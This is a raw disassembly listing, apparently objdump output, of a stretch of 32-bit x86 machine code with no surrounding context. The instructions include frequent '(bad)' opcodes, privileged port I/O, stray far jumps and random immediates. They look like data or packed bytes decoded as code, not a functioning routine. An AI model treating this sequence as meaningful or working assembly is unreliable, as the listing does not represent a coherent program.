  413b5d:	in     eax,0xbb
  413b5f:	and    bl,BYTE PTR [eax-0x26]
  413b62:	or     BYTE PTR ds:0x13d9f880,al
  413b68:	xor    ebx,ebx
  413b6a:	arpl   WORD PTR gs:[ebx+0x38],bp
  413b6e:	sub    al,0x9
  413b70:	shl    dl,cl
  413b72:	lods   eax,DWORD PTR ds:[esi]
  413b73:	fisttp WORD PTR [ebp-0x36]
  413b76:	pop    ss
  413b77:	mov    dh,0xad
  413b79:	ins    DWORD PTR es:[edi],dx
  413b7a:	stos   BYTE PTR es:[edi],al
  413b7b:	in     al,dx
  413b7c:	mov    edi,0xea4a7f38
  413b81:	cli    
  413b82:	pop    esi
  413b83:	xchg   ecx,eax
  413b84:	retf   
  413b85:	(bad)  
  413b87:	inc    ebp
  413b88:	gs dec ebx
  413b8a:	jg     0x413c02
  413b8c:	int    0x0
  413b8e:	mov    ch,0x2f
  413b90:	add    BYTE PTR [edi+0x24],ch
  413b93:	mov    cl,0x75
  413b95:	ins    DWORD PTR es:[edi],dx
  413b96:	ins    BYTE PTR es:[edi],dx
  413b97:	cmp    BYTE PTR [ecx+0x3546ce81],dl
  413b9d:	das    
  413b9e:	aaa    
  413b9f:	mov    ebx,0x6c05d8d1
  413ba4:	sbb    eax,0x9d8412d2
  413ba9:	fwait
  413baa:	das    
  413bab:	aad    0x6e
  413bad:	in     eax,dx
  413bae:	inc    edx
  413baf:	dec    ecx
  413bb0:	xchg   esi,eax
  413bb1:	adc    DWORD PTR [ecx-0x77],ebx
  413bb4:	cs push edx
  413bb6:	add    eax,0x5ab71a0
  413bbb:	adc    dl,bh
  413bbd:	pop    eax
  413bbe:	sbb    DWORD PTR [ebx+ebx*2],edi
  413bc1:	test   al,0x76
  413bc3:	fstp   TBYTE PTR [esi]
  413bc5:	pop    ebx
  413bc6:	loopne 0x413c27
  413bc8:	pop    DWORD PTR [eax-0x3bd0b53f]
  413bce:	ret    0x56c2
  413bd1:	adc    ecx,DWORD PTR [ecx+0x30a62c19]
  413bd7:	pop    ebx
  413bd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bd9:	or     eax,0xf29c79c2
  413bde:	adc    al,0x1f
  413be0:	adc    bh,BYTE PTR [ebx-0x48e44bd3]
  413be6:	xchg   ebp,eax
  413be7:	es ret 0xac01
  413beb:	and    dl,al
  413bed:	push   ebx
  413bee:	cmp    BYTE PTR [edx],ch
  413bf0:	fdivr  QWORD PTR [edx+0x56df156a]
  413bf6:	mov    edi,0x6d199418
  413bfb:	add    BYTE PTR [eax+0x23],ah
  413bfe:	mov    ah,0x76
  413c00:	imul   ebp,DWORD PTR [ecx-0x3e092461],0x86074b6
  413c0a:	ss jno 0x413c1d
  413c0d:	ret    0x23d5
  413c10:	and    edx,ebp
  413c12:	push   esi
  413c13:	mov    ebx,0xceeeda6d
  413c18:	mov    eax,ds:0x3bb5e9b5
  413c1d:	mov    ss,WORD PTR [esi-0x1fb7ed4a]
  413c23:	xor    BYTE PTR [eax+0x55],ch
  413c26:	mov    eax,0x6ed6db6d
  413c2b:	xchg   ebp,eax
  413c2c:	inc    ecx
  413c2d:	push   edi
  413c2e:	in     al,dx
  413c2f:	into   
  413c30:	mov    ecx,0x749e3fb9
  413c35:	push   ss
  413c36:	cmp    cl,BYTE PTR [edx+0x7d085b6e]
  413c3c:	push   ss
  413c3d:	mov    eax,edi
  413c3f:	sti    
  413c40:	test   DWORD PTR [ebp+0x7e02db6d],ecx
  413c46:	mov    edi,0xff742c72
  413c4b:	and    BYTE PTR [eax+ecx*1-0x323ebca0],dl
  413c52:	data16 cli 
  413c54:	(bad)  
  413c55:	mov    al,0xb4
  413c57:	cmp    eax,0xf991eb74
  413c5c:	pop    DWORD PTR [edx+ebx*8]
  413c5f:	mov    dh,0xc
  413c61:	inc    esp
  413c62:	or     eax,0xbb42c2d6
  413c67:	push   0xac561b62
  413c6c:	dec    esi
  413c6d:	loop   0x413c89
  413c6f:	and    dh,BYTE PTR [ecx+0xec2e203]
  413c75:	inc    eax
  413c76:	cmp    al,0x56
  413c79:	dec    eax
  413c7a:	mov    fs,WORD PTR [edx-0x1d]
  413c7d:	(bad)  
  413c7e:	inc    ecx
  413c7f:	inc    edx
  413c80:	mov    esp,gs
  413c82:	je     0x413c6c
  413c84:	out    0xca,eax
  413c86:	or     eax,0x4e86b714
  413c8b:	aas    
  413c8c:	outs   dx,BYTE PTR ds:[esi]
  413c8d:	addr16 hlt 
  413c8f:	ins    DWORD PTR es:[edi],dx
  413c90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c91:	push   esi
  413c92:	fisubr DWORD PTR [esi+0x4b]
  413c95:	lds    eax,FWORD PTR [ebp+0x2]
  413c98:	sbb    bl,ch
  413c9a:	retf   
  413c9b:	test   eax,0xb6d11a71
  413ca0:	cld    
  413ca1:	rcr    BYTE PTR [ecx+edx*8],cl
  413ca4:	test   DWORD PTR ds:0x198ece00,0xb61581b9
  413cae:	pop    ebx
  413caf:	or     eax,0x5476bed6
  413cb4:	inc    edi
  413cb5:	lods   eax,DWORD PTR ds:[esi]
  413cb6:	mov    ebx,0x6b69658
  413cbb:	ins    DWORD PTR es:[edi],dx
  413cbc:	jo     0x413c9c
  413cbe:	push   edx
  413cbf:	pop    edi
  413cc0:	ins    BYTE PTR es:[edi],dx
  413cc1:	mov    eax,edi
  413cc3:	lea    ecx,[edx-0xa98da7b]
  413cc9:	dec    edx
  413cca:	sub    eax,0x2ed0bb9e
  413ccf:	mov    ch,0x33
  413cd1:	sbb    dl,BYTE PTR [ebx-0x2d]
  413cd4:	bound  eax,QWORD PTR [edx]
  413cd6:	icebp  
  413cd7:	mov    DWORD PTR [esi],ecx
  413cd9:	fnsave [esi]
  413cdb:	dec    edx
  413cdc:	les    eax,FWORD PTR [edx+0x34]
  413cdf:	push   edi
  413ce0:	xor    eax,0x36d8775a
  413ce5:	mov    dh,0x96
  413ce7:	xchg   edx,eax
  413ce8:	sub    al,0xc4
  413cea:	mov    ch,0x34
  413cec:	out    0x2,eax
  413cee:	xchg   ecx,eax
  413cef:	fisubr DWORD PTR [esi-0x46e65e0]
  413cf5:	test   al,0xc1
  413cf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cf8:	or     esp,DWORD PTR [edx+0x44d88b5b]
  413cfe:	jle    0x413cd9
  413d00:	cmp    edx,ecx
  413d02:	push   edx
  413d03:	pop    ss
  413d04:	mov    dh,0xda
  413d06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d07:	add    BYTE PTR [edi+0x69345fb5],cl
  413d0d:	(bad)  
  413d0e:	cmp    eax,0xdb0b6d61
  413d13:	push   ebx
  413d14:	jne    0x413cd7
  413d16:	inc    edi
  413d17:	and    DWORD PTR [edx+eiz*1+0x20],0xb6d2ed6a
  413d1f:	mov    al,0x77
  413d21:	mov    esi,DWORD PTR [eax-0x14]
  413d24:	enter  0x2cb1,0x14
  413d28:	in     al,0x68
  413d2a:	push   0xccadf2db
  413d2f:	mov    esi,0xf13f0036
  413d34:	cmp    al,0x47
  413d36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d37:	stos   BYTE PTR es:[edi],al
  413d38:	sbb    al,0x6d
  413d3a:	jmp    0x413d94
  413d3c:	rcl    DWORD PTR [ebp-0x4c],cl
  413d3f:	push   ecx
  413d40:	adc    DWORD PTR [ecx+0x32],esi
  413d43:	push   es
  413d44:	mov    dl,0xb5
  413d46:	mov    cl,0xdd
  413d48:	mov    ecx,0xa42091a5
  413d4d:	int3   
  413d4e:	daa    
  413d4f:	(bad)  
  413d51:	mov    ch,0x4b
  413d53:	cs mov dh,0x38
  413d56:	fiadd  WORD PTR gs:0xed8907b7
  413d5d:	(bad)  
  413d5e:	mov    dh,0xb0
  413d60:	adc    al,0xa5
  413d62:	jbe    0x413d1d
  413d64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d65:	test   al,0x25
  413d67:	pop    esp
  413d68:	outs   dx,BYTE PTR ds:[esi]
  413d69:	add    al,BYTE PTR [esi]
  413d6b:	cmp    ch,BYTE PTR [eax-0x1a59d37b]
  413d71:	fisttp QWORD PTR [eax-0x19]
  413d74:	lea    ecx,[ebp-0x5cfe7ffa]
  413d7a:	inc    ebx
  413d7b:	dec    eax
  413d7c:	dec    ecx
  413d7d:	cld    
  413d7e:	adc    ch,bl
  413d80:	push   ss
  413d81:	mov    dh,0xb6
  413d83:	(bad)  
  413d84:	push   edx
  413d85:	rcl    DWORD PTR [eax+0x2f],cl
  413d88:	and    dh,cl
  413d8a:	dec    edx
  413d8b:	cmp    eax,DWORD PTR [eax+0x3a403f36]
  413d91:	sub    BYTE PTR [eax],ah
  413d93:	ds xor eax,0x16d88369
  413d99:	adc    BYTE PTR [ebp-0x5351e6e3],bl
  413d9f:	enter  0xb689,0xb
  413da3:	pop    ebx
  413da4:	and    BYTE PTR [esi-0x1b],al
  413da7:	mov    dl,0xc6
  413da9:	jecxz  0x413db4
  413dab:	sbb    dh,dl
  413dad:	inc    ecx
  413dae:	pop    ebp
  413daf:	mov    al,ds:0xcc709364
  413db4:	xlat   BYTE PTR ds:[ebx]
  413db5:	ds inc edi
  413db7:	mov    ah,0xdb
  413db9:	rcl    dl,cl
  413dbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413dbc:	jp     0x413dd6
  413dbe:	push   eax
  413dbf:	(bad)
  413dc2:	or     al,0x4d
  413dc4:	cs ins BYTE PTR es:[edi],dx
  413dc6:	ins    BYTE PTR es:[edi],dx
  413dc7:	sub    al,0x8e
  413dc9:	fcmovb st,st(6)
  413dcb:	and    eax,0xc99aa654
  413dd0:	lock in eax,dx
  413dd2:	inc    edx
  413dd3:	in     al,0x8
  413dd5:	(bad)  
  413dd6:	xor    dl,BYTE PTR fs:[edx+0x6c2eb562]
  413ddd:	or     esi,DWORD PTR [ecx]
  413ddf:	jne    0x413e40
  413de1:	bnd jg 0x413e0d
  413de4:	push   0x68bad870
  413de9:	mov    ebx,0x80880c4d
  413dee:	popf   
  413def:	inc    ecx
  413df0:	push   ss
  413df1:	mov    edi,0xaa942eaf
  413df6:	pop    ebp
  413df7:	sub    BYTE PTR [edx],bl
  413df9:	inc    ebp
  413dfa:	pop    edi
  413dfb:	mov    esp,0x2a4b1f22
  413e00:	fsubr  DWORD PTR [esi+0x14]
  413e03:	xor    al,0xcc
  413e05:	lahf   
  413e06:	sbb    al,0xc5
  413e08:	pop    ebp
  413e09:	(bad)  
  413e0a:	inc    eax
  413e0b:	fcomp  QWORD PTR [edx+0x63e055d2]
  413e11:	jp     0x413dbc
  413e13:	jbe    0x413dce
  413e15:	ins    DWORD PTR es:[edi],dx
  413e16:	lea    ebx,[ebx]
  413e18:	in     eax,dx
  413e19:	shr    BYTE PTR [ebx],1
  413e1b:	ds sbb dh,bh
  413e1e:	enter  0xd412,0xa6
  413e22:	add    eax,0x32b040a8
  413e27:	and    cl,ch
  413e29:	clc    
  413e2a:	scas   al,BYTE PTR es:[edi]
  413e2b:	add    ch,BYTE PTR [esi+0x4b]
  413e2e:	sahf   
  413e2f:	inc    ecx
  413e30:	or     BYTE PTR [edi+0x11da7b74],dh
  413e36:	les    esp,FWORD PTR [ebp+0x5a30bf4d]
  413e3c:	and    BYTE PTR [ebx-0x7f15a728],cl
  413e42:	(bad)  
  413e44:	cmp    BYTE PTR [ecx-0x2fe89ac2],dh
  413e4a:	jbe    0x413ead
  413e4c:	pop    ebx
  413e4d:	addr16 (bad) 
  413e4f:	mov    eax,ds:0xe2e52e7d
  413e54:	ja     0x413e85
  413e56:	mov    dh,0xb
  413e58:	push   0x43
  413e5a:	fs in  eax,dx
  413e5c:	sbb    eax,0xd4a7d761
  413e61:	push   edi
  413e62:	ins    BYTE PTR es:[edi],dx
  413e63:	mov    bh,0xd6
  413e65:	fist   DWORD PTR [eax]
  413e67:	dec    BYTE PTR [ebp-0x56]
  413e6a:	push   0xdb1075d4
  413e6f:	lods   eax,DWORD PTR ds:[esi]
  413e70:	and    ch,BYTE PTR [edi]
  413e72:	mov    eax,0x7dac71a0
  413e77:	add    DWORD PTR [eax-0x28],edx
  413e7a:	fsub   DWORD PTR [esi-0x2b]
  413e7d:	add    DWORD PTR [ebp-0x7f9252bf],ecx
  413e83:	mov    eax,0x2747dde0
  413e88:	cwde   
  413e89:	pop    esp
  413e8a:	mov    DWORD PTR [ebp-0x3fa3d5a8],ebp
  413e90:	gs lahf 
  413e92:	sub    eax,0x35b16222
  413e97:	inc    ebp
  413e98:	pop    esp
  413e99:	cmp    bl,BYTE PTR [esi]
  413e9b:	ins    DWORD PTR es:[edi],dx
  413e9c:	sub    eax,0x1bd747b3
  413ea1:	sub    BYTE PTR [esi],0x1a
  413ea4:	pop    edi
  413ea5:	in     eax,dx
  413ea6:	inc    esi
  413ea7:	xor    dl,BYTE PTR [ecx]
  413ea9:	mov    DWORD PTR [ecx+0x5c],0x5f9d0ada
  413eb0:	stos   BYTE PTR es:[edi],al
  413eb1:	add    eax,0x152e3a7f
  413eb6:	das    
  413eb7:	jbe    0x413f2b
  413eb9:	enter  0x1874,0xdc
  413ebd:	lds    eax,FWORD PTR [edi+0x57]
  413ec0:	mov    al,0x6d
  413ec2:	and    dl,BYTE PTR [eax+eax*8]
  413ec5:	cli    
  413ec6:	sub    edi,0x44
  413ec9:	repnz add eax,0x4d205bb6
  413ecf:	cmp    dl,al
  413ed1:	je     0x413f49
  413ed3:	push   es
  413ed4:	mov    ch,0x0
  413ed6:	jmp    0x413f2b
  413ed8:	cmp    cl,BYTE PTR [edx+0x22e4c536]
  413ede:	inc    edx
  413edf:	mov    WORD PTR [edx+0x5dadc0c3],es
  413ee5:	fdiv   st,st(2)
  413ee7:	mov    DWORD PTR [esi-0x63],eax
  413eea:	xlat   BYTE PTR ds:[ebx]
  413eeb:	mov    ecx,0x5b25b798
  413ef0:	pop    ss
  413ef1:	dec    ebp
  413ef2:	add    BYTE PTR [ecx],cl
  413ef4:	or     al,0xd5
  413ef6:	cmp    eax,0x1b029265
  413efb:	sbb    eax,0x63452344
  413f00:	mov    BYTE PTR [ecx],ah
  413f02:	fcmovnb st,st(6)
  413f04:	ret    0x4ac2
  413f07:	pop    ebx
  413f08:	fs std 
  413f0a:	and    bh,BYTE PTR [ebx-0x53]
  413f0d:	jecxz  0x413e98
  413f0f:	cmp    DWORD PTR [eax-0x3a0249ea],esp
  413f15:	push   ebp
  413f16:	sbb    al,0x56
  413f18:	and    DWORD PTR [edx],ebx
  413f1a:	add    ch,BYTE PTR [esi+0x5d]
  413f1d:	mov    es:0x756b8574,al
  413f23:	shl    DWORD PTR [esi+0x1196db6d],0xce
  413f2a:	push   eax
  413f2b:	ficomp DWORD PTR ds:0x8f1b4745
  413f31:	adc    eax,0x96db6b68
  413f36:	or     cl,dl
  413f38:	ds sti 
  413f3a:	mov    eax,ds:0xc68ebb
  413f3f:	pop    ebx
  413f40:	push   esp
  413f41:	add    eax,0x4b819b2c
  413f46:	pop    ebp
  413f47:	adc    DWORD PTR [edi-0x77],ecx
  413f4a:	enter  0x90bf,0x41
  413f4e:	out    dx,eax
  413f4f:	fdiv   QWORD PTR [esi+0x5986b62f]
  413f55:	test   al,0x66
  413f57:	jmp    0x413fb8
  413f59:	sbb    dl,BYTE PTR [edi]
  413f5b:	ror    DWORD PTR [ebx+0x6db4fb42],cl
  413f61:	test   BYTE PTR [edx],bl
  413f63:	ret    0xb0e3
  413f66:	sbb    BYTE PTR [ecx-0x257980ec],bh
  413f6c:	mov    edx,0xa3a8dfc0
  413f71:	and    bh,dh
  413f73:	cmp    eax,0xad406ba3
  413f78:	and    DWORD PTR [esi-0x745e6904],0xc45db50e
  413f82:	ins    DWORD PTR es:[edi],dx
  413f83:	jecxz  0x413fa8
  413f85:	mov    al,0x13
  413f87:	pop    ebx
  413f88:	dec    esp
  413f89:	jne    0x414005
  413f8b:	jmp    0xec17:0x83b96b46
  413f92:	or     edi,DWORD PTR [eax+0x5b883d90]
  413f98:	or     eax,0x559aed0
  413f9d:	xor    DWORD PTR [esi],ecx
  413f9f:	pop    ecx
  413fa0:	and    ch,BYTE PTR [edx]
  413fa2:	xor    eax,0x18826c11
  413fa7:	mov    eax,ds:0x1545a558
  413fac:	inc    ebp
  413fad:	mov    ecx,DWORD PTR [edx]
  413faf:	mov    ah,0x23
  413fb1:	outs   dx,DWORD PTR ds:[esi]
  413fb2:	je     0x413ff5
  413fb4:	dec    ebx
  413fb5:	push   esp
  413fb6:	ins    DWORD PTR es:[edi],dx
  413fb7:	mov    ebx,0xcefa37c3
  413fbc:	fld    DWORD PTR [edi+0x5a]
  413fbf:	stc    
  413fc0:	fdiv   DWORD PTR [esi]
  413fc2:	dec    edx
  413fc3:	or     ebx,DWORD PTR [ebx-0x20]
  413fc6:	xor    eax,0x92b30e48
  413fcb:	jo     0x413f76
  413fcd:	pop    ebp
  413fce:	fcomp  DWORD PTR [edi+0x5240c7c8]
  413fd4:	pop    ss
  413fd5:	enter  0x1f9a,0x1
  413fd9:	mov    bh,0x6d
  413fdb:	mov    ds:0x53a71228,eax
  413fe0:	sbb    ebp,DWORD PTR [ebx+0x2d]
  413fe3:	or     esp,edx
  413fe5:	ficom  DWORD PTR [edx+0x57]
  413fe8:	jne    0x413f95
  413fea:	and    ecx,DWORD PTR [ebp-0x4e4bc3f8]
  413ff0:	jge    0x413fa2
  413ff2:	or     edi,DWORD PTR [edi-0x35]
  413ff5:	ds mov al,0xdd
  413ff8:	adc    dh,BYTE PTR [ecx+0x40]
  413ffb:	sub    al,0x44
  413ffd:	sub    al,0x98
  413fff:	jmp    FWORD PTR [edx+0xa6dad2d]
  414005:	jbe    0x414048
  414007:	push   ebp
  414008:	mov    WORD PTR [edx-0x28973ba6],?
  41400e:	dec    esp
  41400f:	add    al,0x97
  414011:	mov    dh,0xf1
  414013:	in     al,dx
  414014:	push   edi
  414015:	je     0x414076
  414017:	mov    gs:0x8add0536,al
  41401d:	adc    edx,eax
  41401f:	inc    ecx
  414020:	(bad)  
  414021:	xchg   esi,eax
  414022:	push   ebp
  414023:	push   eax
  414024:	jne    0x414001
  414026:	(bad)  
  414027:	sub    al,0xec
  414029:	inc    ebx
  41402a:	mov    bl,0xe4
  41402c:	xor    bl,BYTE PTR [ebp-0x25]
  41402f:	mov    dh,0xb5
  414031:	jne    0x41402d
  414033:	dec    esp
  414034:	add    DWORD PTR [eax+0x758fba7c],0xffffff89
  41403b:	jp     0x413feb
  41403d:	call   0x88019308
  414042:	mov    edx,0x687c8cf3
  414047:	fmul   QWORD PTR [edx]
  414049:	mov    bh,0x6b
  41404b:	bound  ecx,QWORD PTR [eax-0x369a3249]
  414051:	sbb    dh,0xad
  414054:	lods   eax,DWORD PTR ds:[esi]
  414055:	ins    DWORD PTR es:[edi],dx
  414056:	pop    ss
  414057:	cmp    DWORD PTR ds:0x17c6d722,ebx
  41405d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41405e:	popf   
  41405f:	popf   
  414060:	test   eax,0x938161a0
  414065:	mov    ebp,0x44c7b24f
  41406a:	(bad)  [esi-0x4cfb6530]
  414070:	lods   al,BYTE PTR ds:[esi]
  414071:	and    al,0xe
  414073:	cdq    
  414074:	aam    0x9c
  414076:	lods   eax,DWORD PTR ds:[esi]
  414077:	sub    DWORD PTR [eax+0x7a0c6c8d],eax
  41407d:	pcmpgtb mm7,QWORD PTR [eax]
  414080:	shl    BYTE PTR [esi+0x6b],cl
  414083:	fisttp DWORD PTR ds:0x2cd39ba6
  414089:	sti    
  41408a:	popf   
  41408b:	sub    al,0xaa
  41408d:	jmp    0x37518e63
  414092:	ficom  DWORD PTR [esi-0x7a]
  414095:	data16 sar cl,0x8b
  414099:	dec    esp
  41409a:	mov    es,WORD PTR [edx+0x380b4bad]
  4140a0:	pop    eax
  4140a1:	mov    eax,0x1b6c06bb
  4140a6:	pop    ebp
  4140a7:	lds    edx,FWORD PTR [ebx-0x7c]
  4140aa:	nop
  4140ab:	or     ebx,DWORD PTR [edx+0x12]
  4140ae:	cmp    bl,ah
  4140b0:	mov    eax,0x832c2e95
  4140b5:	pop    ebp
  4140b6:	jae    0x414119
  4140b8:	shl    BYTE PTR [edi+0x119ee335],1
  4140be:	jno    0x414069
  4140c0:	test   eax,0xdeb09316
  4140c5:	push   0xd85140ad
  4140ca:	push   ebp
  4140cb:	jne    0x41409e
  4140cd:	xchg   ecx,eax
  4140ce:	sub    ecx,DWORD PTR [eax]
  4140d0:	mov    ds:0x3ac6ad85,eax
  4140d5:	mov    ebp,0x82f7a0a5
  4140da:	and    BYTE PTR [ebp+0x7105db6d],dh
  4140e0:	xor    DWORD PTR ds:0x4d816fbd,esp
  4140e6:	jb     0x414147
  4140e8:	pop    ebx
  4140e9:	adc    eax,esp
  4140eb:	(bad)  
  4140ec:	pusha  
  4140ed:	push   es
  4140ee:	ret    
  4140ef:	retf   
  4140f0:	sbb    al,0x7
  4140f2:	sub    DWORD PTR [esi],eax
  4140f4:	pusha  
  4140f5:	fistp  DWORD PTR [edx-0x2f0ea380]
  4140fb:	ja     0x414098
  4140fd:	sbb    al,dl
  4140ff:	ror    DWORD PTR [edx],1
  414101:	pop    ebx
  414102:	mov    ds:0xb2369ec6,eax
  414107:	cmp    DWORD PTR [ebp+0xab605d],ebp
  41410d:	shr    DWORD PTR [ebp+0x50464ee7],cl
  414113:	adc    al,0xa6
  414115:	mov    BYTE PTR [ebp-0x30],cl
  414118:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414119:	test   al,0xc6
  41411b:	fsub   DWORD PTR [edx+0x36]
  41411e:	mov    ch,BYTE PTR [edx-0x2c393ba3]
  414124:	or     bh,BYTE PTR [edx+0x70a36dc8]
  41412a:	jmp    0x4140ee
  41412c:	cld    
  41412d:	lds    esi,FWORD PTR ds:0xd9e17699
  414133:	out    dx,eax
  414134:	fist   DWORD PTR [esi-0x6]
  414137:	rcr    DWORD PTR [esi+0x5fd9fed8],0x86
  41413e:	or     esp,DWORD PTR [esi]
  414140:	mov    eax,ds:0xabf6dab9
  414145:	dec    ebx
  414146:	or     ch,cl
  414148:	test   BYTE PTR [edi-0xd],dh
  41414b:	popf   
  41414c:	jp     0x4140f3
  41414e:	sbb    al,BYTE PTR [esi+0x5b]
  414151:	mov    al,ds:0x9c63eb16
  414156:	scas   al,BYTE PTR es:[edi]
  414157:	dec    edx
  414158:	dec    eax
  414159:	push   ss
  41415a:	cmp    cl,BYTE PTR [edx+0x33bcbddb]
  414160:	lds    ebx,FWORD PTR [eax-0x476f0e9c]
  414166:	mov    ah,ch
  414168:	xchg   edi,eax
  414169:	jno    0x414172
  41416b:	inc    ebx
  41416c:	add    BYTE PTR [edx-0x4a60af17],bl
  414172:	mov    ds:0x67b545ba,eax
  414177:	sbb    BYTE PTR [eax+0x77],0x14
  41417b:	push   0x7c
  41417d:	ficom  DWORD PTR [ebp+eiz*2-0x7e]
  414181:	js     0x4141c4
  414183:	sub    esi,edx
  414185:	test   al,0xba
  414187:	push   esp
  414188:	fsub   DWORD PTR [edx]
  41418a:	in     eax,dx
  41418b:	scas   eax,DWORD PTR es:[edi]
  41418c:	mov    ?,WORD PTR [edx+eiz*8+0x6db45d68]
  414193:	add    bh,dl
  414195:	test   al,0xd5
  414197:	adc    ebp,esi
  414199:	dec    ebp
  41419a:	push   ss
  41419b:	ins    DWORD PTR es:[edi],dx
  41419c:	mov    ebx,0x87f56d6d
  4141a1:	fstp   DWORD PTR [edi]
  4141a3:	xchg   dl,bh
  4141a5:	xchg   edi,eax
  4141a6:	or     ah,0x29
  4141a9:	dec    edx
  4141aa:	inc    eax
  4141ab:	dec    ebx
  4141ac:	pop    ebx
  4141ad:	test   ebp,esi
  4141af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141b0:	sbb    eax,0xb616dbcf
  4141b5:	lea    esi,[ecx]
  4141b7:	jle    0x41414e
  4141b9:	dec    eax
  4141ba:	icebp  
  4141bb:	retf   
  4141bc:	sub    DWORD PTR [edi-0x59],edi
  4141bf:	mov    BYTE PTR [esi+0x63],dh
  4141c2:	popa   
  4141c3:	add    BYTE PTR [ecx],0xdb
  4141c6:	stos   DWORD PTR es:[edi],eax
  4141c7:	pop    ss
  4141c8:	call   FWORD PTR [ecx-0x5f]
  4141cb:	ins    DWORD PTR es:[edi],dx
  4141cc:	sub    BYTE PTR ds:0x3b43141e,0xb9
  4141d3:	xor    bh,ch
  4141d5:	mov    ch,0x6d
  4141d7:	pop    es
  4141d8:	jne    0x414208
  4141da:	gs jge 0x41422f
  4141dd:	mov    dl,0x7d
  4141df:	std    
  4141e0:	push   esi
  4141e1:	jmp    0x41418d
  4141e3:	mov    edx,0xc7c4adb5
  4141e8:	out    dx,al
  4141e9:	call   0x8585:0xc6475d1f
  4141f0:	ins    DWORD PTR es:[edi],dx
  4141f1:	test   eax,0x5876b08c
  4141f6:	and    bh,0x3f
  4141f9:	dec    eax
  4141fa:	ins    DWORD PTR es:[edi],dx
  4141fb:	fld    TBYTE PTR [eax-0x49]
  4141fe:	inc    esp
  4141ff:	push   cs
  414200:	test   al,0xa4
  414202:	dec    esi
  414203:	scas   al,BYTE PTR es:[edi]
  414204:	xchg   BYTE PTR [esi-0x752492bf],ch
  41420a:	lea    edi,[eax+0x30]
  41420d:	in     al,dx
  41420e:	push   ds
  41420f:	pop    es
  414210:	push   0xadb6feed
  414215:	add    eax,DWORD PTR [eax-0x46b851c]
  41421b:	mov    dh,0x11
  41421d:	repz sub eax,0x92dd0034
  414223:	or     ah,BYTE PTR [esi-0x73c83426]
  414229:	inc    ebp
  41422a:	aad    0xc5
  41422c:	mov    dh,0xe3
  41422e:	leave  
  41422f:	fwait
  414230:	push   cs
  414231:	int3   
  414232:	push   0xffffffa9
  414234:	and    esp,eax
  414236:	(bad)  
  414237:	pop    ecx
  414238:	push   cs
  414239:	mov    ecx,0xa5b9bb76
  41423e:	mov    ecx,0x6172b62e
  414243:	popa   
  414244:	xchg   edi,eax
  414245:	push   ss
  414246:	jb     0x4141ec
  414248:	daa    
  414249:	outs   dx,DWORD PTR ds:[esi]
  41424a:	pop    ebp
  41424b:	push   0x9e7db500
  414250:	popf   
  414251:	or     eax,0x970ae240
  414256:	fisubr DWORD PTR [ebp-0x45fdb2a1]
  41425c:	xor    eax,0xc7598a7a
  414261:	ins    BYTE PTR es:[edi],dx
  414262:	dec    ebp
  414263:	inc    eax
  414264:	fsub   QWORD PTR [esi]
  414266:	push   edx
  414267:	push   esp
  414268:	dec    edx
  414269:	push   edx
  41426a:	adc    DWORD PTR [ebp+0x41],esi
  41426d:	(bad)  [esi-0x40afffbf]
  414273:	or     eax,0x60822e6b
  414278:	fcmovnu st,st(0)
  41427a:	push   0x25
  41427c:	xchg   esp,eax
  41427d:	stos   DWORD PTR es:[edi],eax
  41427e:	mov    cl,0xc2
  414280:	jnp    0x414247
  414282:	jb     0x41422d
  414284:	ins    DWORD PTR es:[edi],dx
  414285:	dec    eax
  414286:	shl    DWORD PTR [ebx-0x4d],0xce
  41428a:	sub    ebx,DWORD PTR [esi+0x69634228]
  414290:	pop    es
  414291:	xchg   bp,ax
  414293:	jmp    0x4142be
  414295:	mov    ah,0xf2
  414297:	call   0xc430:0xd6d2db85
  41429e:	stos   BYTE PTR es:[edi],al
  41429f:	push   cs
  4142a0:	xor    al,0x32
  4142a2:	and    edi,esp
  4142a4:	push   ss
  4142a5:	call   0xfe869dfb
  4142aa:	push   ds
  4142ab:	int3   
  4142ac:	fist   DWORD PTR [esi-0x45]
  4142af:	pusha  
  4142b0:	(bad)  [edx-0x26]
  4142b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142b4:	mov    dh,0x55
  4142b6:	pop    ds
  4142b7:	xor    eax,0x6db8d406
  4142bc:	or     esp,DWORD PTR [esp+ebp*4+0x41]
  4142c0:	int    0x5f
  4142c2:	xor    DWORD PTR [edi-0x6d],0x56b6176b
  4142c9:	push   ebp
  4142ca:	push   ebx
  4142cb:	in     eax,dx
  4142cc:	loop   0x414337
  4142ce:	sbb    eax,0xd02ed162
  4142d3:	adc    eax,0x942fd774
  4142d8:	or     al,0x33
  4142da:	push   eax
  4142db:	(bad)  
  4142dc:	mov    ebx,0xa146db1
  4142e1:	aas    
  4142e2:	repnz fidivr DWORD PTR [eax+eiz*2+0x6871107b]
  4142ea:	push   eax
  4142eb:	fild   DWORD PTR [esi+0x6c]
  4142ee:	fimul  WORD PTR [ebp+0x1d]
  4142f1:	jmp    0x5ba4ae61
  4142f6:	aaa    
  4142f7:	push   0x44
  4142f9:	scas   eax,DWORD PTR es:[edi]
  4142fa:	stc    
  4142fb:	(bad)  
  4142fc:	scas   eax,DWORD PTR es:[edi]
  4142fd:	dec    eax
  4142fe:	neg    ebx
  414300:	outs   dx,BYTE PTR ds:[esi]
  414301:	or     eax,0x4740b068
  414306:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414307:	mov    eax,0xa917a48c
  41430c:	mov    ds:0xf83456e2,eax
  414311:	and    dh,ah
  414313:	cwde   
  414314:	aam    0x6b
  414316:	pop    ss
  414317:	mov    dh,0x6d
  414319:	cmp    bh,BYTE PTR [eax]
  41431b:	mov    ah,0xf8
  41431d:	js     0x414347
  41431f:	mov    ds:0xd6b95c3a,al
  414324:	add    eax,0xdadb6dc0
  414329:	mov    WORD PTR [esi+ecx*2-0x775985f7],?
  414330:	or     ebp,ebp
  414332:	(bad)  
  414333:	aad    0x65
  414335:	sub    BYTE PTR [ecx+0x12],bh
  414338:	pusha  
  414339:	mov    dh,0x80
